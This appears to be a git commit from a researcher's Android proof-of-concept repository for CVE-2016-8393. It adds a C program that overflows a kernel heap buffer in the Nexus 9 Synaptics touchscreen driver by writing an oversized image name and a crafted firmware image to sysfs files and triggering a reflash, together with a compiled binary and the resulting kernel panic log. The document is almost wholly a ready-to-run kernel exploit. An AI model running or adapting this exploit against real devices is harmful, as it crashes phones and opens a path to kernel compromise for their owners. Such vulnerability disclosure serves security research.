sagi__Android_POCs
commit 5bba93bad752d17484c6ddf19dfb8ce71ea87130
Author:     Sagi Kedmi <sagi@users.noreply.github.com>
AuthorDate: Sat Jan 14 04:11:14 2017 +0200
Commit:     Sagi Kedmi <sagi@users.noreply.github.com>
CommitDate: Sat Jan 14 04:11:14 2017 +0200

    CVE-2016-8393

diff --git a/CVE-2016-8393/3 b/CVE-2016-8393/3
new file mode 100755
index 0000000..bf32505
Binary files /dev/null and b/CVE-2016-8393/3 differ
diff --git a/CVE-2016-8393/3.c b/CVE-2016-8393/3.c
new file mode 100644
index 0000000..44971e7
--- /dev/null
+++ b/CVE-2016-8393/3.c
@@ -0,0 +1,164 @@
+// 3.c
+//
+// POC for Kernel Heap Overflow #3
+//
+// TESTED ON:
+// [ro.build.fingerprint]:
+// google/volantis/flounder:6.0.1/MOB30W/3031100:user/release-keys
+// google/volantis/flounder:7.0/NRD90M/3085278:user/release-keys
+// google/volantis/flounder:7.0/NRD90R/3141966:user/release-keys
+//
+// Sagi Kedmi (@sagikedmi), 07.09.2016, IBM Security.
+
+#define SYSFS_SYNAPTICS_IMAGENAME "/sys/devices/platform/spi-tegra114.2/spi_master/spi2/spi2.0/input/input0/imagename"
+#define SYSFS_SYNAPTICS_IMAGESIZE "/sys/devices/platform/spi-tegra114.2/spi_master/spi2/spi2.0/input/input0/imagesize"
+#define SYSFS_SYNAPTICS_DOREFLASH "/sys/devices/platform/spi-tegra114.2/spi_master/spi2/spi2.0/input/input0/doreflash"
+#define SYSFS_SYNAPTICS_DATA "/sys/devices/platform/spi-tegra114.2/spi_master/spi2/spi2.0/input/input0/data"
+
+#define MAX_IMAGE_NAME_LEN 256
+
+#define POC3_IMG "3poc.img"
+
+#include <errno.h>                                                              
+#include <stddef.h>                                                             
+#include <stdio.h>                                                              
+#include <stdbool.h>
+#include <stdint.h>
+#include <stdlib.h>                                                             
+#include <string.h>                                                             
+#include <unistd.h>                                                             
+#include <fcntl.h>                                                              
+#include <time.h>                                                               
+#include <sys/types.h>                                                          
+#include <sys/stat.h>                                                           
+#include <sys/time.h> 
+
+// Set imagename to be "PR6666666...", 253 '6' characters.
+int set_image_name(){
+    int fd;
+    char image_name[MAX_IMAGE_NAME_LEN];
+    
+    image_name[MAX_IMAGE_NAME_LEN - 1] = 0;
+
+    fd = open(SYSFS_SYNAPTICS_IMAGENAME, O_WRONLY);
+    if (fd < 0){
+        perror("Failed to open \"imagename\" virtual file");
+        return EXIT_FAILURE;
+    }
+
+    image_name[0] = 'P';
+    image_name[1] = 'R';
+    memset(image_name + 2, '6', MAX_IMAGE_NAME_LEN - 1 - 2);
+
+    if (write(fd, image_name, sizeof(image_name)) != sizeof(image_name)){
+        perror("Failed to write payload entirely");
+        close(fd);
+        return EXIT_FAILURE;
+    }
+    close(fd);
+    return EXIT_SUCCESS;
+}
+
+int set_image_size(unsigned int fw_img_size){
+    int fd;
+    char buf_size[10];
+
+    fd = open(SYSFS_SYNAPTICS_IMAGESIZE, O_WRONLY);
+    sprintf(buf_size,"%u", fw_img_size);
+
+    if (fd < 0){
+        perror("Failed to open \"imagesize\" virtual file");
+        return EXIT_FAILURE;
+    }
+
+    if (write(fd, buf_size, strlen(buf_size) + 1) != (strlen(buf_size) + 1)){
+        perror("Failed to write heap buffer size entirely");
+        close(fd);
+        return EXIT_FAILURE;
+    }
+    close(fd);
+}
+
+void print_mem(void const *vp, size_t n)                                        
+{                                                                               
+    unsigned char const *p = vp;                                                
+    int i;                                                                      
+    for (i=0; i<n; i++)                                                         
+        printf("%02x", p[i]);                                                   
+    putchar('\n');                                                              
+}    
+
+// Loading img from filesystem
+int get_image_data(unsigned char **fw_img, unsigned int *fw_img_size){
+    FILE *fp;
+
+    if (!(fp = fopen(POC3_IMG, "r"))) {
+        perror("blechs");
+        return EXIT_FAILURE;
+    }
+    fseek(fp, 0L, SEEK_END);
+
+    *fw_img_size = ftell(fp);
+    fseek(fp, 0L, SEEK_SET);
+
+    *fw_img = (unsigned char *)malloc(*fw_img_size + 1);
+    if (!fw_img){
+        perror("Failed to allocate memory for fw_img");
+        return EXIT_FAILURE;
+    }
+
+    fread(*fw_img, 1, *fw_img_size, fp);
+
+    fclose(fp);
+    return EXIT_SUCCESS;
+}
+
+// Upload img to kernelspace
+int set_image_data(unsigned char *fw_img, unsigned int fw_img_size){
+    FILE *fp;
+    if (!(fp = fopen(SYSFS_SYNAPTICS_DATA, "wb"))){
+        perror("Failed to open \"data\" virtual file");
+        return EXIT_FAILURE;
+    }
+    if (fwrite(fw_img, 1, fw_img_size, fp) != fw_img_size){
+        perror("Failed to write payload entirely");
+        fclose(fp);
+        return EXIT_FAILURE;
+    }
+    fclose(fp);
+    return EXIT_SUCCESS;
+}
+// Reflash the driver with our crafted .img 
+int set_doreflash(){
+    int fd;
+    fd = open(SYSFS_SYNAPTICS_DOREFLASH, O_WRONLY);
+    if (fd < 0){
+        perror("Failed to open \"data\" virtual file");
+        return EXIT_FAILURE;
+    }
+
+    if (write(fd, "1", 2) != 2){
+        perror("Failed to write payload entirely");
+        close(fd);
+        return EXIT_FAILURE;
+    }
+    close(fd);
+    return EXIT_SUCCESS;
+}
+
+int main (void){
+    unsigned int fw_img_size;
+    unsigned char *fw_img;
+
+    get_image_data(&fw_img, &fw_img_size);
+
+    set_image_name();    
+    set_image_size(fw_img_size);
+    set_image_data(fw_img, fw_img_size);
+    set_doreflash();
+    
+    free(fw_img);
+
+    // Nexus 9 should crash now (may take couple of seconds...)
+    return EXIT_SUCCESS; 
+}
diff --git a/CVE-2016-8393/3.crash b/CVE-2016-8393/3.crash
new file mode 100644
index 0000000..d57e938
--- /dev/null
+++ b/CVE-2016-8393/3.crash
@@ -0,0 +1,329 @@
+[  467.340338] Unable to handle kernel paging request at virtual address 3636363636363636
+[  467.340471] pgd = ffffffc04cf50000
+[  467.340498] [3636363636363636] *pgd=0000000000000000
+[  467.340546] Internal error: Oops: 96000004 [#1] PREEMPT SMP
+[  467.340590] CPU: 1 PID: 2409 Comm: 3 Tainted: G        W    3.10.101-ga139acc #1
+[  467.340618] task: ffffffc04358ab00 ti: ffffffc04cb2c000 task.ti: ffffffc04cb2c000
+[  467.340666] PC is at __kmalloc+0xa4/0x26c
+[  467.340696] LR is at __kmalloc+0x1ec/0x26c
+[  467.340721] pc : [<ffffffc000195044>] lr : [<ffffffc00019518c>] pstate: 60000045
+[  467.340741] sp : ffffffc04cb2f9a0
+[  467.340763] x29: ffffffc04cb2f9a0 x28: ffffffc0028ec918 
+[  467.340811] x27: 00000000000f070d x26: ffffffc0010c3000 
+[  467.340854] x25: 000000003f120000 x24: ffffffc00062d3ec 
+[  467.340894] x23: 0000000000000005 x22: 00000000000000d0 
+[  467.340934] x21: 3636363636363636 x20: ffffffc04cb2c000 
+[  467.340973] x19: ffffffc06e401e40 x18: 0000000000000000 
+[  467.341016] x17: 0000000000017825 x16: 0000000000000012 
+[  467.341056] x15: 0000000000000001 x14: 0000000000000006 
+[  467.341096] x13: 0000000000000013 x12: 0000000000000000 
+[  467.341135] x11: 0000000000000043 x10: 00000000000000ef 
+[  467.341175] x9 : ffffffc04cb2f750 x8 : ffffffc02d0c4a00 
+[  467.341215] x7 : ffffffc02d0c4a00 x6 : ffffffc02d0c4200 
+[  467.341254] x5 : 0000000000000040 x4 : 0000000000000000 
+[  467.341315] x3 : 0000000000000000 x2 : 0000000000000040 
+[  467.341424] x1 : 0000000000000001 x0 : 0000000000000000 
+[  467.341475] 
+[  467.341475] PC: 0xffffffc000194fc4:
+[  467.341500] 4fc4  aa1e03f8 2a0103f6 54000fc8 97ff7406 f100401f aa0003f3 540005c9 f0006ba0
+[  467.341618] 4fe4  b94f6800 121c0000 6a16001f 54000c41 910003e0 f000797a 9272c414 b9405280
+[  467.341729] 5004  11000400 b9005280 9127c340 b9805681 f9400275 f8617819 8b1902a0 f940041b
+[  467.341839] 5024  b9405280 51000400 b9005280 f9400280 37080e80 f8796ab5 b40003d5 b9802260
+[  467.341950] 5044  f8606aa7 d53b4225 d50342df b9805680 9127c344 f9400261 52800003 f8607882
+[  467.342060] 5064  aa0103e0 f8626806 eb0602bf 54000900 d51b4225 34fffc43 b9802260 f8a068e0
+[  467.342170] 5084  37780276 b9401a79 d503201f aa1503f3 aa1303e0 f9402bfb a94153f3 a9425bf5
+[  467.342280] 50a4  a94363f7 a9446bf9 a8c67bfd d65f03c0 aa1303e0 2a1603e1 aa1803e2 97fffa61
+[  467.342407] 
+[  467.342407] LR: 0xffffffc00019510c:
+[  467.342489] 510c  9ac12401 3607fc21 b9405280 11000400 b9005280 f00073e0 93407f39 91060000
+[  467.342601] 512c  f9401413 b4000173 f9400266 aa1803e1 f9400660 aa1503e2 aa1703e3 aa1903e4
+[  467.342711] 514c  2a1603e5 d63f00c0 f8410e60 b5fffee0 b9405280 51000400 b9005280 f9400280
+[  467.342821] 516c  360ff920 942157d1 17ffffc7 d00057e0 528073c1 9123c000 52800002 97fd522e
+[  467.342932] 518c  17ffff9a 91002021 f8626821 eb01037f 54fff6c1 f8226807 91000b7b 52800023
+[  467.343043] 51ac  b9805681 f9400260 f8617881 91002000 f821681b 17ffffad d1000417 d28007e2
+[  467.343153] 51cc  d34cfef7 dac012f7 cb170042 11000442 97fffd8a aa0003f3 aa1303e0 f9402bfb
+[  467.343264] 51ec  a94153f3 a9425bf5 a94363f7 a9446bf9 a8c67bfd d65f03c0 942157ac 17ffff8c
+[  467.343392] 
+[  467.343392] SP: 0xffffffc04cb2f920:
+[  467.343413] f920  4cb2c000 ffffffc0 36363636 36363636 000000d0 00000000 00000005 00000000
+[  467.343584] f940  0062d3ec ffffffc0 3f120000 00000000 010c3000 ffffffc0 000f070d 00000000
+[  467.343695] f960  028ec918 ffffffc0 4cb2f9a0 ffffffc0 0019518c ffffffc0 4cb2f9a0 ffffffc0
+[  467.343807] f980  00195044 ffffffc0 60000045 00000000 6e401e40 ffffffc0 00000048 00000000
+[  467.343916] f9a0  4cb2fa00 ffffffc0 0062d3ec ffffffc0 02928400 ffffffc0 00000048 00000000
+[  467.344027] f9c0  00000007 00000000 02928400 ffffffc0 00000005 00000000 028a0800 ffffffc0
+[  467.344137] f9e0  2d0c4200 ffffffc0 496fc240 ffffffc0 4cb2fa90 ffffffc0 02879ac8 ffffffc0
+[  467.344248] fa00  4cb2fae0 ffffffc0 0062e54c ffffffc0 02928400 ffffffc0 0103e430 ffffffc0
+[  467.344367] 
+[  467.344367] X6: 0xffffffc02d0c4180:
+[  467.344388] 4180  21760d80 ffffffc0 00000000 00000000 00000000 00000000 00000000 00000000
+[  467.344574] 41a0  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
+[  467.344684] 41c0  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
+[  467.344793] 41e0  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
+[  467.344901] 4200  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
+[  467.345010] 4220  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
+[  467.345119] 4240  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
+[  467.345226] 4260  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
+[  467.345339] 
+[  467.345339] X7: 0xffffffc02d0c4980:
+[  467.345359] 4980  21760d80 ffffffc0 00000000 00000000 00000000 00000000 00000000 00000000
+[  467.345480] 49a0  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
+[  467.345661] 49c0  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
+[  467.345770] 49e0  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
+[  467.345878] 4a00  2d0c5800 ffffffc0 727bbf69 0000006c 00000275 00000000 29f21f00 ffffffc0
+[  467.345988] 4a20  6bdbf000 ffffffc0 6d0e3180 ffffffc0 6d0e3840 ffffffc0 6d0e3480 ffffffc0
+[  467.346097] 4a40  6d0e36c0 ffffffc0 6d0e3cc0 ffffffc0 6d0e3300 ffffffc0 5e144180 ffffffc0
+[  467.346207] 4a60  5e144480 ffffffc0 686a6900 ffffffc0 52175cc0 ffffffc0 52175f00 ffffffc0
+[  467.346323] 
+[  467.346323] X8: 0xffffffc02d0c4980:
+[  467.346343] 4980  21760d80 ffffffc0 00000000 00000000 00000000 00000000 00000000 00000000
+[  467.346452] 49a0  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
+[  467.346571] 49c0  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
+[  467.346742] 49e0  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
+[  467.346851] 4a00  2d0c5800 ffffffc0 727bbf69 0000006c 00000275 00000000 29f21f00 ffffffc0
+[  467.346960] 4a20  6bdbf000 ffffffc0 6d0e3180 ffffffc0 6d0e3840 ffffffc0 6d0e3480 ffffffc0
+[  467.347070] 4a40  6d0e36c0 ffffffc0 6d0e3cc0 ffffffc0 6d0e3300 ffffffc0 5e144180 ffffffc0
+[  467.347179] 4a60  5e144480 ffffffc0 686a6900 ffffffc0 52175cc0 ffffffc0 52175f00 ffffffc0
+[  467.347291] 
+[  467.347291] X9: 0xffffffc04cb2f6d0:
+[  467.347312] f6d0  01052000 ffffffc0 4cb2c000 ffffffc0 00000000 00000000 00c7aaa8 ffffffc0
+[  467.347422] f6f0  4cb2f880 ffffffc0 4358ab00 ffffffc0 3f120000 00000000 010c3000 ffffffc0
+[  467.347531] f710  96000004 ffffffff 00003958 0000000b 4cb2f760 ffffffc0 009e2244 ffffffc0
+[  467.347655] f730  36363636 36363636 96000004 00000000 4cb2f880 ffffffc0 58e996c0 ffffffc0
+[  467.347816] f750  60000045 00000000 00000025 00000000 4cb2f790 ffffffc0 00097d30 ffffffc0
+[  467.347926] f770  4cb2f880 ffffffc0 96000004 00000000 36363636 36363636 58e996c0 ffffffc0
+[  467.348034] f790  4cb2f7c0 ffffffc0 000981d0 ffffffc0 96000004 00000000 00e88b48 ffffffc0
+[  467.348144] f7b0  36363636 36363636 4cb2f880 ffffffc0 4cb2f7d0 ffffffc0 0008160c ffffffc0
+[  467.348264] 
+[  467.348264] X19: 0xffffffc06e401dc0:
+[  467.348287] 1dc0  00000000 00000008 00000000 00000000 00000080 00000040 00000000 00000000
+[  467.348395] 1de0  6e402080 ffffffc0 6e401ea8 ffffffc0 6e401d28 ffffffc0 677121c0 ffffffc0
+[  467.348504] 1e00  6e401ec0 ffffffc0 6e401d40 ffffffc0 6769a298 ffffffc0 6769a280 ffffffc0
+[  467.348623] 1e20  00f0fb80 ffffffc0 677148c0 ffffffc0 00000001 00000007 6e400f80 ffffffc0
+[  467.348791] 1e40  00e38cc0 ffffffc0 00000000 00000000 00000005 00000000 00000040 00000040
+[  467.348900] 1e60  00000000 0000001e 00000040 00000000 00000040 00000000 00000040 00000000
+[  467.349008] 1e80  00000000 00000009 00000000 00000000 00000040 00000040 00000000 00000000
+[  467.349116] 1ea0  6e402040 ffffffc0 6e401f68 ffffffc0 6e401de8 ffffffc0 67712280 ffffffc0
+[  467.349229] 
+[  467.349229] X20: 0xffffffc04cb2bf80:
+[  467.349250] bf80  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
+[  467.349358] bfa0  00000000 00000000 00000000 00000000 00000000 04040404 00000000 78737373
+[  467.349466] bfc0  f8f8f8f8 dedddddd f7f7f7f7 80737373 08000000 1d040404 19000000 19000000
+[  467.349575] bfe0  19000000 19000000 19000000 19000000 19000000 19000000 19000000 19000000
+[  467.349697] c000  00000008 00000000 ffffffff ffffffff 4358ab00 ffffffc0 00effaa0 ffffffc0
+[  467.349861] c020  000c3c54 ffffffc0 00000000 00000000 00000000 00000000 00000000 00000000
+[  467.349970] c040  00000000 00000000 00000000 00000000 00000002 00000001 57ac6e9d 00000000
+[  467.350078] c060  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
+[  467.350191] 
+[  467.350191] X24: 0xffffffc00062d36c:
+[  467.350211] d36c  a90153f3 a90363f7 a9046bf9 a90573fb 53003c77 53003c34 f94002c4 11000af5
+[  467.350320] d38c  f9400ac3 937a7ea0 52901a01 910243bb f9400898 f940007c f90037a2 a90a7fbf
+[  467.350428] d3ac  a90b7fbf a90c7fbf a90d7fbf f9004bbb f9004fbb 97ed9ef8 aa0003f9 b4000ec0
+[  467.350537] d3cc  53087e82 53003ee0 32196042 52801a01 f9003ba0 390227b4 390223a2 97ed9eee
+[  467.350646] d3ec  aa0003f3 b4000c40 9102e2da aa1a03e0 940ef505 aa1603e0 2a1403e1 97fffed1
+[  467.350766] d40c  7100081f 54000b01 9100c320 910223a4 52800003 52800027 b81e0007 7100047f
+[  467.350931] d42c  51000862 d100c008 b9404381 8b020262 781fa001 54000c69 f81d8002 f9400761
+[  467.351040] d44c  11000463 f9000760 6b0302bf f900001b 91000484 f9000401 f9000020 91010000
+[  467.351153] 
+[  467.351153] X26: 0xffffffc0010c2f80:
+[  467.351173] 2f80  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
+[  467.351282] 2fa0  01004060 ffffffc0 010040e8 ffffffc0 01004170 ffffffc0 010041f8 ffffffc0
+[  467.351393] 2fc0  01004280 ffffffc0 01004308 ffffffc0 01004390 ffffffc0 01004418 ffffffc0
+[  467.351502] 2fe0  010044a0 ffffffc0 01004528 ffffffc0 010045b0 ffffffc0 01004638 ffffffc0
+[  467.351612] 3000  010046c0 ffffffc0 01004748 ffffffc0 010047d0 ffffffc0 01004858 ffffffc0
+[  467.351720] 3020  010048e0 ffffffc0 01004968 ffffffc0 010049f0 ffffffc0 01004a78 ffffffc0
+[  467.351839] 3040  01004b00 ffffffc0 01004b88 ffffffc0 01004c10 ffffffc0 01004c98 ffffffc0
+[  467.352000] 3060  01004d20 ffffffc0 01004da8 ffffffc0 01004e30 ffffffc0 01004eb8 ffffffc0
+[  467.352112] 
+[  467.352112] X28: 0xffffffc0028ec898:
+[  467.352133] c898  00000000 00000000 00000000 00000000 6e5ea4d8 ffffffc0 02b0eeb0 ffffffc0
+[  467.352242] c8b8  028ec7f0 ffffffc0 00000001 00000000 00000000 00000000 00f68aa8 ffffffc0
+[  467.352351] c8d8  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
+[  467.352459] c8f8  00000000 00000000 028edc00 ffffffc0 028a0a50 ffffffc0 00469de4 ffffffc0
+[  467.352569] c918  00000000 00000052 00000000 ffffffff 00000000 000000be 00000000 00000000
+[  467.352676] c938  00002008 00000000 00000000 00000000 00000000 00000000 00000064 00000014
+[  467.352785] c958  0000001e 0000001e 00000000 00000000 00000000 00000000 028edc18 ffffffc0
+[  467.352905] c978  00000005 0000000a 0293c000 ffffffc0 00000000 00000000 81240002 00002d5e
+[  467.353088] 
+[  467.353088] X29: 0xffffffc04cb2f920:
+[  467.353108] f920  4cb2c000 ffffffc0 36363636 36363636 000000d0 00000000 00000005 00000000
+[  467.353217] f940  0062d3ec ffffffc0 3f120000 00000000 010c3000 ffffffc0 000f070d 00000000
+[  467.353327] f960  028ec918 ffffffc0 4cb2f9a0 ffffffc0 0019518c ffffffc0 4cb2f9a0 ffffffc0
+[  467.353435] f980  00195044 ffffffc0 60000045 00000000 6e401e40 ffffffc0 00000048 00000000
+[  467.353545] f9a0  4cb2fa00 ffffffc0 0062d3ec ffffffc0 02928400 ffffffc0 00000048 00000000
+[  467.353654] f9c0  00000007 00000000 02928400 ffffffc0 00000005 00000000 028a0800 ffffffc0
+[  467.353763] f9e0  2d0c4200 ffffffc0 496fc240 ffffffc0 4cb2fa90 ffffffc0 02879ac8 ffffffc0
+[  467.353882] fa00  4cb2fae0 ffffffc0 0062e54c ffffffc0 02928400 ffffffc0 0103e430 ffffffc0
+[  467.354040] 
+[  467.354065] Process 3 (pid: 2409, stack limit = 0xffffffc04cb2c058)
+[  467.354092] Stack: (0xffffffc04cb2f9a0 to 0xffffffc04cb30000)
+[  467.354125] f9a0: 4cb2fa00 ffffffc0 0062d3ec ffffffc0 02928400 ffffffc0 00000048 00000000
+[  467.354157] f9c0: 00000007 00000000 02928400 ffffffc0 00000005 00000000 028a0800 ffffffc0
+[  467.354187] f9e0: 2d0c4200 ffffffc0 496fc240 ffffffc0 4cb2fa90 ffffffc0 02879ac8 ffffffc0
+[  467.354218] fa00: 4cb2fae0 ffffffc0 0062e54c ffffffc0 02928400 ffffffc0 0103e430 ffffffc0
+[  467.354247] fa20: 00000000 00000000 02928438 ffffffc0 00000002 00000000 4cb2fc38 ffffffc0
+[  467.354275] fa40: 00000000 00000000 496fc240 ffffffc0 00000000 00000000 496fc200 ffffffc0
+[  467.354306] fa60: 4cb2fa80 ffffffc0 4cb2fb88 ffffffc0 00000005 00000000 02928400 ffffffc0
+[  467.354335] fa80: 4cb2fae0 ffffffc0 00624880 ffffffc0 4cb2fa90 ffffffc0 4cb2fa90 ffffffc0
+[  467.354366] faa0: 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
+[  467.354395] fac0: 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
+[  467.354425] fae0: 4cb2fba0 ffffffc0 0062fb00 ffffffc0 000000dd 00000000 0103e430 ffffffc0
+[  467.354455] fb00: 00000000 00000000 02928438 ffffffc0 00000002 00000000 00aa6c08 ffffffc0
+[  467.354484] fb20: 00000000 00000000 0103e000 ffffffc0 00000000 00000000 02928400 ffffffc0
+[  467.354513] fb40: 00000002 00000000 00aa6c08 ffffffc0 00000000 00000000 0103e000 ffffffc0
+[  467.354542] fb60: 4cb2fc58 ffffffc0 00000002 00000000 4cb2fba0 ffffffc0 0062fae4 ffffffc0
+[  467.354570] fb80: 000000dd 00000000 0103e430 ffffffc0 00000000 00000000 00000000 00000000
+[  467.354600] fba0: 4cb2fc70 ffffffc0 00631680 ffffffc0 00000001 00000000 02928400 ffffffc0
+[  467.354630] fbc0: 00aa7000 ffffffc0 010ed000 ffffffc0 02928458 ffffffc0 00cea000 ffffffc0
+[  467.354659] fbe0: ffffffde 00000000 001a6e4c 00000000 496fc200 ffffffc0 028e7400 ffffffc0
+[  467.354689] fc00: 00aa6dc8 ffffffc0 00000008 ffffffc0 0103e368 ffffffc0 001a6e4c 00000000
+[  467.354717] fc20: 00000001 ffffffc0 00000064 00000000 4cb2fc40 ffffffc0 06130043 ffff1201
+[  467.354746] fc40: 496fc200 ffffffc0 00631681 ffffffc0 00000001 00000000 02928402 ffffffc0
+[  467.354777] fc60: 00aa7000 ffffffc0 010ed000 ffffffc0 4cb2fcc0 ffffffc0 00635138 ffffffc0
+[  467.354808] fc80: 00000000 00000000 02928400 ffffffc0 00aa7000 ffffffc0 010ed000 ffffffc0
+[  467.354837] fca0: 02928400 ffffffc0 00000001 00000000 006ad1e0 ffffffc0 01075868 01ffffc0
+[  467.355338] fcc0: 4cb2fd80 ffffffc0 00635950 ffffffc0 010ed000 ffffffc0 ffffffea ffffffff
+[  467.355370] fce0: 00000002 00000000 02928400 ffffffc0 4cb2fec8 ffffffc0 028f6150 ffffffc0
+[  467.355457] fd00: 02921278 ffffffc0 00000040 00000000 00e87000 ffffffc0 4cb2c000 ffffffc0
+[  467.355484] fd20: 4cb2fd50 ffffffc0 028e7400 ffffffc0 4cb2fd00 ffffffc0 4cb2fd80 ffffffc0
+[  467.355510] fd40: 00000000 00000000 ffffffd0 00000000 4c000000 ffffffc0 ee5a7a32 00016000
+[  467.355537] fd60: 00000400 ffffffc0 00000000 00000000 35377306 00003430 00000000 ffff0001
+[  467.355562] fd80: 4cb2fdc0 ffffffc0 004625a4 ffffffc0 00000002 00000000 4ae36480 ffffffc0
+[  467.355589] fda0: 00a74070 ffffffc0 4ae364a0 ffffffc0 4cb2fdc0 ffffffc0 0015afd8 00000001
+[  467.355616] fdc0: 4cb2fdd0 ffffffc0 0020cff8 ffffffc0 4cb2fe30 ffffffc0 0019f280 ffffffc0
+[  467.355642] fde0: 4ae65300 ffffffc0 00000002 00000000 4cb2fec8 ffffffc0 4cb2c000 ffffffc0
+[  467.355669] fe00: 00462c18 00000000 00000004 00000000 00000116 00000000 0019f244 ffffffc0
+[  467.355694] fe20: 4ae65300 ffffffc0 00462c18 00000000 4cb2fe80 ffffffc0 0019f58c ffffffc0
+[  467.355721] fe40: 4ae65300 ffffffc0 00000000 00000000 ffffffff ffffffff 00462c18 00000000
+[  467.355747] fe60: 00000002 00000000 00000004 00000000 00020001 ffff0000 00000022 00000100
+[  467.355774] fe80: c54430b0 0000007f 00085388 ffffffc0 004001d8 00000000 00000000 00000000
+[  467.355800] fea0: ffffffff ffffffff 00418e8c 00000000 60000000 00000000 00000015 00000000
+[  467.355826] fec0: 00000116 00000000 00000000 00000000 00000004 00000000 00462c18 00000000
+[  467.355852] fee0: 00000002 00000000 00000000 00000000 fbad2c05 00000000 1290b000 00000071
+[  467.355878] ff00: 00000000 00000000 00000000 00000000 00000040 00000000 00000000 00000000
+[  467.355903] ff20: 00000000 00000000 00000000 00000000 03000900 00514100 00000000 00000000
+[  467.355928] ff40: 00000000 00000000 00495428 00000000 00000000 00000000 00000001 00000000
+[  467.355954] ff60: 00000000 00000000 004001d8 00000000 00000000 00000000 004001d8 00000000
+[  467.355979] ff80: 00000000 00000000 00000000 00000000 00401984 00000000 00401a3c 00000000
+[  467.356004] ffa0: 00000000 00000000 00000000 00000000 00000000 00000000 c54430b0 0000007f
+[  467.356030] ffc0: 004012a4 00000000 c54430b0 0000007f 00418e8c 00000000 60000000 00000000
+[  467.356056] ffe0: 00000004 00000000 00000040 00000000 00000000 00000000 00000000 00000000
+[  467.356075] Call trace:
+[  467.356110] [<ffffffc000195044>] __kmalloc+0xa4/0x26c
+[  467.356150] [<ffffffc00062d3ec>] synaptics_rmi4_spi_read+0x90/0x278
+[  467.356178] [<ffffffc00062e54c>] synaptics_rmi4_f12_init+0x7c/0x538
+[  467.356262] [<ffffffc00062fb00>] synaptics_rmi4_query_device+0x62c/0xcbc
+[  467.356291] [<ffffffc000631680>] synaptics_rmi4_reset_device+0xa0/0x1ac
+[  467.356318] [<ffffffc000635138>] synaptics_fw_updater+0x134/0x8b0
+[  467.356345] [<ffffffc000635950>] fwu_sysfs_do_reflash_store+0x9c/0xf8
+[  467.356449] [<ffffffc0004625a4>] dev_attr_store+0x18/0x28
+[  467.356482] [<ffffffc00020cff8>] sysfs_write_file+0xdc/0x154
+[  467.356513] [<ffffffc00019f280>] vfs_write+0xa8/0x1b4
+[  467.356536] [<ffffffc00019f58c>] SyS_write+0x54/0x1ac
+[  467.356563] Code: 37080e80 f8796ab5 b40003d5 b9802260 (f8606aa7) 
+[  467.357853] ---[ end trace 1b75b31a2719ed20 ]---
+[  467.422605] Kernel panic - not syncing: Fatal exception
+[  467.422630] CPU0: stopping
+[  467.422654] CPU: 0 PID: 2404 Comm: MicroRecognitio Tainted: G      D W    3.10.101-ga139acc #1
+[  467.422666] Call trace:
+[  467.422692] [<ffffffc000089ff0>] dump_backtrace+0x0/0x16c
+[  467.422706] [<ffffffc00008a170>] show_stack+0x14/0x1c
+[  467.422735] [<ffffffc0009e4cd4>] dump_stack+0x20/0x28
+[  467.422749] [<ffffffc0000905b8>] handle_IPI+0x148/0x154
+[  467.422761] [<ffffffc0000817f0>] gic_handle_irq+0x94/0x1a0
+[  467.422774] Exception stack(0xffffffc05edb7e80 to 0xffffffc05edb7fa0)
+[  467.422792] 7e80: ea54c5a0 00000074 ebddf1d4 00000074 ffffffff ffffffff 06b34b98 00000075
+[  467.422807] 7ea0: 00000001 00000000 00000000 00000000 ea54c5e0 00000074 000003ce 00000000
+[  467.422821] 7ec0: 06bfe160 00000075 5edb4000 ffffffc0 ff00e400 00000074 ea54c5a0 00000074
+[  467.422834] 7ee0: ebddf1d4 00000074 000010e9 00000000 ea54c478 00000074 71217aa0 00000000
+[  467.422847] 7f00: 7975ee0c 00000000 00000000 00000000 00000000 00000000 00000000 00000000
+[  467.422859] 7f20: 00000000 00000000 00000000 00000000 00000000 00000000 066b2ba4 00000075
+[  467.422872] 7f40: 066b2c04 00000075 00000000 00000000 066a9100 00000075 00000000 00000000
+[  467.422885] 7f60: 00705cd8 00000000 ea54c5a0 00000074 ebddf1d4 00000074 ea54c5dc 00000074
+[  467.422897] 7f80: ff00e400 00000074 000010e9 00000000 066a1c80 00000075 ea54c5e0 00000074
+[  467.443115] trusty-log panic notifier - trusty version Build: 2887673, Built: 19:38:21 May 19 2016
+[  467.443130] tegra_wdt_panic_handler: set watchdog timeout to 4
+[  467.443146] Rebooting in 5 seconds..watchdog fiq cpu 1
+pid: 2409  comm: 3
+  x0 0000000000002ee0   x1 0000000000001231
+  x2 0000000156f36d9b   x3 ffffffc0010c39f0
+  x4 000000000000003e   x5 ffffffc001075870
+  x6 ffffffc0006ad1e0   x7 ffffffc001075868
+  x8 0000000000000001   x9 0000000000000020
+ x10 0000000000000063  x11 000000000000006f
+ x12 000000000000006e  x13 0000000000000064
+ x14 0000000000000073  x15 000000000000002e
+ x16 000000000000002e  x17 0000007c0961ff00
+ x18 00000000ffffffff  x19 ffffffc001054000
+ x20 0000000000000f3c  x21 0000000000000000
+ x22 0000000000000fa0  x23 0000000000000002
+ x24 ffffffc000eff000  x25 00000000000003e8
+ x26 ffffffc000effbf8  x27 00000000000f070d
+ x28 ffffffc0028ec918  x29 ffffffc04cb2f640
+ x30 ffffffc000311440   sp ffffffc04cb2f640
+  pc ffffffc000311408 cpsr 800000c5 (EL1h)
+
+__delay+0x28/0x34:
+  pc ffffffc000311408   sp ffffffc04cb2f640   fp ffffffc04cb2f640
+panic+0x1a8/0x214:
+  pc ffffffc0009e26fc   sp ffffffc04cb2f650   fp ffffffc04cb2f650
+die+0x190/0x19c:
